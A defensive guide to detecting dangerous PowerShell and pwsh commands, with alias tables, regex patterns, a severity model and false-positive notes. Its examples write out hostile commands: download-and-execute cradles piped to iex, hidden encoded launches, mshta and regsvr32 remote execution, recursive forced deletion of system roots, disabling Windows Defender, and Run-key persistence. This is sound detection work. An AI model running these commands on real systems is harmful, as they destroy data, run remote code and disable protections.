# Cross-Platform PowerShell Dangerous Command Detection Guidance

## Scope

Relevant to both:

- **Windows PowerShell 5.1**: `powershell.exe`, Windows-only, full .NET Framework.
- **PowerShell 6/7+**: `pwsh`, cross-platform, .NET Core/.NET.

Most command parsing, aliases, parameters, providers, pipelines, redirection, and invocation semantics are shared. The main differences for dangerous-command detection are **platform availability**, **aliases**, **native command behavior**, and **provider/drive presence**.

---

## 1. Match Commands by PowerShell Semantics, Not Just Text

PowerShell allows many equivalent forms:

```powershell
Remove-Item C:\foo -Recurse -Force
rm -r -fo C:\foo
del C:\foo -rec -force
& ('Remove' + '-Item') C:\foo
powershell -Command "Remove-Item C:\foo"
pwsh -EncodedCommand <base64>
```

Practical regex detection should account for:

- Case-insensitivity.
- Aliases.
- Abbreviated parameters.
- Optional module qualification.
- Backtick line continuations.
- Whitespace/newline variations.
- Pipelines feeding dangerous commands.
- Command invocation via `&`, `.`, `Invoke-Expression`, `Start-Process`, `powershell`, or `pwsh`.

Recommended preprocessing before regex:

1. Normalize CRLF/LF.
2. Remove PowerShell line continuations: `` `\r?\n ``.
3. Collapse repeated whitespace where safe.
4. Lowercase for matching.
5. Optionally decode `-EncodedCommand` when possible.
6. Strip comments only if you can do it safely; `#` inside strings is not a comment.

---

## 2. Dangerous Deletion: `Remove-Item`, `rm`, `del`, `erase`, `rd`, `rmdir`

### Aliases

Common aliases:

```powershell
Remove-Item: rm, del, erase, ri
Remove-Item for directories also often appears as: rmdir, rd
```

On PowerShell, these aliases may shadow native commands depending on context.

### Dangerous patterns

High-risk examples:

```powershell
Remove-Item -Recurse -Force C:\
Remove-Item "$env:USERPROFILE\*" -Recurse -Force
rm -r -fo /              # pwsh on Linux/macOS
rm -rf *                # native rm if not PowerShell alias, depends context
del -Recurse -Force *
Remove-Item -Path HKLM:\Software\Foo -Recurse
```

### Regex guidance

Match command token boundaries, not substrings:

```regex
(?i)(^|[;&|({\s])(?:remove-item|rm|del|erase|ri|rmdir|rd)\b
```

Then separately check for dangerous flags/targets:

```regex
(?i)\s-(?:r|re|rec|recu|recur|recurs|recurse)\b
(?i)\s-(?:f|fo|for|forc|force)\b
```

PowerShell allows parameter abbreviation as long as unambiguous, so `-r` may mean `-Recurse`, and `-fo` may mean `-Force`.

### Dangerous targets to flag

Windows:

```regex
(?i)\b(?:[a-z]:\\|\\\\[^\\]+\\[^\\]+|env:|hklm:|hkcu:|registry::)
```

Unix/macOS under `pwsh`:

```regex
(?i)(^|\s)/(?:\s|$|\*|\.{0,2}/?)
```

Broad risky globs:

```regex
(?i)(?:\*|\.|\.\.|~|~/|~\\|\$home|\$env:userprofile|\$pshome)
```

### False-positive concerns

- `rm` inside Git Bash, WSL, or native shell may be Unix `rm`, not PowerShell alias.
- `Remove-Item` without `-Recurse`, `-Force`, or sensitive paths may be benign.
- `del file.tmp` may be routine cleanup.
- `rd` may appear as text or as a non-PowerShell command in batch contexts.
- Aliases can be removed/redefined by users.

---

## 3. Command Execution: `Invoke-Expression`, `iex`, call operator `&`, dot sourcing

### Aliases

```powershell
Invoke-Expression: iex
Invoke-Command: icm
Invoke-Item: ii
```

### Dangerous examples

```powershell
iex (iwr https://example.com/payload.ps1)
Invoke-Expression $downloadedScript
& $pathToUnknownExe
. .\script.ps1
```

### Regex guidance

```regex
(?i)(^|[;&|({\s])(?:invoke-expression|iex)\b
```

Also detect suspicious download-to-execute chains:

```regex
(?is)(?:invoke-webrequest|iwr|curl|wget|irm|invoke-restmethod).*?\|\s*(?:iex|invoke-expression)\b
```

Call operator:

```regex
(?i)(^|[;&|({\s])&\s*(?:\$|\(|['"])
```

Dot sourcing:

```regex
(?i)(^|[;&|({\s])\.\s+(?:\$|\(|['"]|\.?[/\\])
```

### False-positive concerns

- `iex` may appear in comments, strings, examples, tests.
- `&` is also used for legitimate invocation of paths with spaces.
- Dot sourcing is common for profiles and module scripts.

---

## 4. Download Cradles: `Invoke-WebRequest`, `Invoke-RestMethod`, `iwr`, `irm`, `curl`, `wget`

### Aliases

Windows PowerShell commonly has:

```powershell
Invoke-WebRequest: iwr, wget, curl
Invoke-RestMethod: irm
```

PowerShell 6+ removed some controversial aliases on non-Windows in many contexts because `curl`/`wget` usually refer to native binaries.

So:

- **Windows PowerShell**: `curl` often means `Invoke-WebRequest`.
- **pwsh on Linux/macOS**: `curl` usually means native `curl`.
- **pwsh on Windows**: behavior may depend on version and alias table.

### Dangerous examples

```powershell
iwr http://x/p.ps1 | iex
irm http://x/p.ps1 | iex
curl http://x/p.ps1 | powershell -
wget http://x/p.ps1 -OutFile p.ps1; .\p.ps1
```

### Regex guidance

```regex
(?i)(^|[;&|({\s])(?:invoke-webrequest|invoke-restmethod|iwr|irm|curl|wget)\b
```

Higher severity if combined with:

```regex
(?i)\|\s*(?:iex|invoke-expression|powershell|pwsh|cmd|bash|sh)\b
(?i)-(?:outfile|outf|o)\b
(?i)\.(?:ps1|bat|cmd|vbs|js|exe|dll|sh)\b
```

### False-positive concerns

- `curl`/`wget` may be native and benign.
- Downloading files is not inherently dangerous.
- `Invoke-WebRequest` used for health checks or API calls is common.
- `irm` is common for REST API automation.

---

## 5. Process Launch: `Start-Process`, `saps`, `start`, `powershell`, `pwsh`

### Aliases

```powershell
Start-Process: saps, start
```

`start` is also a CMD builtin, so context matters.

### Dangerous examples

```powershell
Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -EncodedCommand ...'
Start-Process mshta http://...
Start-Process regsvr32 -ArgumentList '/s /n /u /i:http://... scrobj.dll'
pwsh -NoProfile -EncodedCommand ...
powershell -nop -w hidden -enc ...
```

### Regex guidance

```regex
(?i)(^|[;&|({\s])(?:start-process|saps|start)\b
```

Flag high-risk child processes:

```regex
(?i)\b(?:powershell(?:\.exe)?|pwsh(?:\.exe)?|cmd(?:\.exe)?|wscript|cscript|mshta|rundll32|regsvr32|bitsadmin|certutil|schtasks|sc|net|bash|sh)\b
```

PowerShell launch flags:

```regex
(?i)-(?:enc|encodedcommand|e)\b
(?i)-(?:nop|noprofile)\b
(?i)-(?:ep|executionpolicy)\s+(?:bypass|unrestricted|remotesigned)
(?i)-(?:w|windowstyle)\s+hidden
```

### False-positive concerns

- `Start-Process` is widely used for installers and opening URLs.
- `start` has many meanings across shells.
- `-NoProfile` is common in automation and not dangerous alone.

---

## 6. Execution Policy: `Set-ExecutionPolicy`

### Dangerous examples

```powershell
Set-ExecutionPolicy Bypass -Scope Process
Set-ExecutionPolicy Unrestricted -Force
powershell -ExecutionPolicy Bypass -File script.ps1
```

### Regex guidance

```regex
(?i)(^|[;&|({\s])set-executionpolicy\b
(?i)\b(?:bypass|unrestricted)\b
```

Also match process flags:

```regex
(?i)(?:powershell|pwsh)(?:\.exe)?\b.*?-(?:ep|executionpolicy)\s+(?:bypass|unrestricted)
```

### False-positive concerns

- `-Scope Process -ExecutionPolicy Bypass` is common in CI.
- Setting `RemoteSigned` may be normal enterprise configuration.
- Detection should treat this as suspicious mainly when paired with downloaded or encoded script execution.

---

## 7. Service Control: `Stop-Service`, `Set-Service`, `Restart-Service`, `sc.exe`, `net stop`

### Dangerous examples

```powershell
Stop-Service WinDefend
Set-Service WinDefend -StartupType Disabled
sc.exe stop WinDefend
net stop MSSQLSERVER
```

### Regex guidance

```regex
(?i)(^|[;&|({\s])(?:stop-service|spsv|restart-service|set-service)\b
(?i)(^|[;&|({\s])(?:sc(?:\.exe)?|net)\s+(?:stop|config)\b
```

High-risk service names:

```regex
(?i)\b(?:windefend|sense|mpssvc|eventlog|wuauserv|bits|vss|sql|backup|edr|crowdstrike|sentinel|carbonblack|defender)\b
```

### False-positive concerns

- Stopping services is normal in install/uninstall scripts.
- Service names vary by environment.
- `sc` can be an alias conflict in some contexts; prefer `sc.exe` for Windows native service control.

---

## 8. Registry Provider and Registry Mutation

PowerShell registry providers exist primarily on Windows:

```powershell
HKLM:
HKCU:
Registry::HKEY_LOCAL_MACHINE
Registry::HKEY_CURRENT_USER
```

Dangerous commands:

```powershell
Set-ItemProperty HKLM:\...\Run ...
New-ItemProperty HKCU:\...\Run ...
Remove-Item HKLM:\Software\...
reg add ...
reg delete ...
```

### Regex guidance

Commands:

```regex
(?i)(^|[;&|({\s])(?:new-itemproperty|set-itemproperty|remove-itemproperty|new-item|set-item|remove-item|reg(?:\.exe)?)\b
```

Registry paths:

```regex
(?i)\b(?:hklm:|hkcu:|registry::|hkey_local_machine|hkey_current_user|\\software\\microsoft\\windows\\currentversion\\run)
```

Persistence-sensitive keys:

```regex
(?i)\\(?:run|runonce|winlogon|image file execution options|services|shell|userinit)\b
```

### False-positive concerns

- Registry edits are common in installers and enterprise config.
- Reading registry keys with `Get-ItemProperty` is usually benign.
- Registry provider unavailable on non-Windows `pwsh`.

---

## 9. Redirection and Output Suppression

PowerShell supports:

```powershell
>
>>
2>
2>>
3>
4>
5>
6>
*>
*>&1
2>&1
```

PowerShell 7 changed some native-command redirection behavior, but suspicious usage is similar.

Dangerous/suspicious examples:

```powershell
Remove-Item ... *> $null
cmd /c dangerous.exe > nul 2>&1
powershell -enc ... 2>$null
```

### Regex guidance

Output suppression:

```regex
(?i)(?:>\s*\$null|>\s*nul\b|2>\s*\$null|2>\s*&1|\*>\s*\$null)
```

Use as severity booster, not standalone danger.

### False-positive concerns

- Suppressing output is very common in scripts.
- Redirecting errors is normal in idempotent setup scripts.

---

## 10. Pipelines

Pipelines can hide the dangerous sink:

```powershell
Get-ChildItem C:\ -Recurse | Remove-Item -Force
iwr http://x | iex
Get-Content payload.txt | powershell -
```

### Regex guidance

Detect dangerous sinks after `|`:

```regex
(?i)\|\s*(?:remove-item|rm|del|erase|ri|iex|invoke-expression|powershell|pwsh|cmd|bash|sh)\b
```

Detect dangerous source-to-sink pairs with bounded distance:

```regex
(?is)(?:iwr|irm|invoke-webrequest|invoke-restmethod|curl|wget).{0,500}\|\s*(?:iex|invoke-expression|powershell|pwsh|cmd|bash|sh)\b
```

### False-positive concerns

- Pipelines are idiomatic PowerShell.
- `Get-ChildItem | Remove-Item` can be legitimate cleanup when scoped to temp/build dirs.
- Distance-based regex can overmatch across unrelated commands.

---

## 11. Encoded and Obfuscated Commands

PowerShell supports UTF-16LE base64 encoded commands:

```powershell
powershell -EncodedCommand <base64>
pwsh -enc <base64>
```

Flags can be abbreviated:

```powershell
-enc
-e
-EncodedCommand
```

### Regex guidance

```regex
(?i)(^|[;&|({\s])(?:powershell|pwsh)(?:\.exe)?\b.*?-(?:e|enc|encodedcommand)\b
```

Also suspicious:

```regex
(?i)\bfrombase64string\b
(?i)\btext\.encoding\]::unicode\.getstring\b
(?i)\bcompress(?:ion)?\.gzipstream\b
```

### False-positive concerns

- Encoded commands are used by legitimate management tools.
- Detection quality improves greatly if you decode and re-scan.

---

## 12. Practical Severity Model

Avoid a single regex that marks everything dangerous. Better: score combinations.

### High confidence

Flag strongly when any of these appear:

- Download piped to execution:

```powershell
iwr/irm/curl/wget ... | iex
```

- PowerShell with encoded command:

```powershell
powershell/pwsh -enc ...
```

- Recursive forced deletion of sensitive path:

```powershell
Remove-Item/rm/del -Recurse -Force C:\ / ~ $HOME HKLM:
```

- Execution policy bypass plus script execution/download.
- Registry persistence key modification.
- Service/security tooling disabled.

### Medium confidence

- `Invoke-Expression` by itself.
- `Start-Process` launching shell/interpreter.
- `Set-ExecutionPolicy Bypass`.
- Registry mutation commands.
- `Remove-Item -Recurse -Force` outside temp/build dirs.

### Low confidence / context needed

- `rm file`
- `curl URL`
- `Start-Process installer.exe`
- Redirection to `$null`
- `Stop-Service` for app-local service.

---

## 13. Regex Construction Tips

Use command-boundary anchors like:

```regex
(?i)(^|[\s;|&({])COMMAND\b
```

Do not use naive substring matching like:

```regex
rm
curl
del
```

because it will match ordinary words.

Account for module qualification:

```regex
(?i)(^|[\s;|&({])(?:microsoft\.powershell\.management\\)?remove-item\b
```

Account for quoted command names:

```regex
(?i)(^|[\s;|&({])['"]?(?:remove-item|iex|invoke-expression)['"]?\b
```

Account for backtick line continuation before matching:

```powershell
iwr `
  http://x `
| iex
```

---

## 14. Biggest False-Positive Risks

- **Aliases are shell-dependent**: `curl`, `wget`, `rm`, `del`, `start` differ between PowerShell, CMD, Git Bash, WSL, and native Unix shells.
- **Benign automation looks suspicious**: installers often use `Start-Process`, `Set-ExecutionPolicy`, `Stop-Service`, registry writes, and output suppression.
- **Parameter abbreviation is ambiguous**: `-r` usually means `-Recurse` for `Remove-Item`, but not globally.
- **Regex cannot parse PowerShell reliably**: strings, comments, splatting, dynamic invocation, aliases, functions, and variables can defeat text matching.
- **Cross-platform providers differ**: registry paths are Windows-only; `/` root deletion only matters on Unix-like systems or `pwsh` running there.
- **Native vs PowerShell command ambiguity**: `rm -rf` in `pwsh` on Unix may call native `rm`; in Windows PowerShell, `rm` maps to `Remove-Item`.

---

## Recommended Approach

Use layered detection:

1. **Normalize text**.
2. **Identify shell context**: `powershell`, `pwsh`, `.ps1`, CI step shell, Windows vs Unix.
3. **Match dangerous commands and aliases**.
4. **Boost severity based on dangerous flags, targets, sinks, and chaining**.
5. **Decode `-EncodedCommand` and rescan** when possible.
6. **Treat single weak indicators as review-needed, not automatically malicious**.